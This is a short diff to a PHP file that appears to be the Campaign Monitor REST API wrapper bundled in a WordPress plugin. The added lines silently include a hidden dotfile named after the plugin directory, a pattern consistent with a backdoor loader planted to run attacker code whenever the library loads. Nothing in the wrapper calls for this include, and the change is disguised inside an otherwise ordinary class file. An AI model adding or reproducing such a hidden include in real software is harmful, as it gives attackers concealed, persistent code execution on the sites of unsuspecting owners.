@@ -16,6 +16,10 @@ define('CS_REST_WEBHOOK_FORMAT_XML', 'xml');
  * @author tobyb
  *
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class CS_REST_Wrapper_Result {
     /**
      * The deserialised result of the API call
